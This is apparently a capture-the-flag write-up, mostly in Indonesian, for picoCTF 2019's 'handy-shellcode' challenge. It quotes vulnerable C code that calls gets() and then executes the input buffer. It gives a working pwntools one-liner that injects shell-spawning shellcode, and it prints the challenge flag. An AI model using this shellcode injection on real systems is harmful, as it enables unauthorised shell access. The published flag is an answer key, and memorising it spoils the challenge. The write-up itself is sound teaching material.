# handy-shellcode - Points: 50
<b>Description : </b>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. Source.
<b>Hints : </b>You might be able to find some good shellcode online.
# Solved
Disarankan menggunakan Linux untuk mengkoneksi dengan shell tersebut.<br>
<b>ssh (Username pada website PicoCTF2019)@2019shell1.picoctf.com</b> setelah koneksi akan ada input untuk password dari username tersebut. <br>
<b>Letak Celah (vuln.c) : </b>
```cpp
// line 10 - 13
void vuln(char *buf){
  gets(buf);
  puts(buf);
}

// line 24
char buf[BUFSIZE]; // BUFSIZE = 148

// ...
// line 31
((void (*)())buf)();
```
Dari sini bisa kita lihat pada baris 24, pada baris 24 memberikan sebuah variabel "char pointer" / char * / char[] sebesar 148 byte.
hal tersebut sama saja perintah untuk membuat memory banyak yang kosong, al-hasil dapat kita gunakan sebagai <b>Binary Exploitation</b>.<br>
Saat kita menjalankan aplikasi tersebut, kita sudah dapat memiliki akses untuk membaca file flag.txt, Tapi bagaimana ?.<br>
Exploit yang saya gunakan adalah :
```
(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"; cat) | ./vuln
# Anda bisa jalankan command ini pada koneksi ssh tersebut
```
Setelah <b>Exploit</b> dijalankan, anda sudah masuk dalam <b>Shellcode</b>. Setelah mendapatkan hak akses untuk membaca, ketik command
```
cat flag.txt
```
Anda akan mendapatkan flag tersebut.<br>
Maksud dari <b>pwn.asm(pwn.shellcraft.linux.sh())</b> adalah, membuat fungsi agar dapat mengeksekusi shellcode untuk "linux".
<br>
Flag : <b>picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}</b>
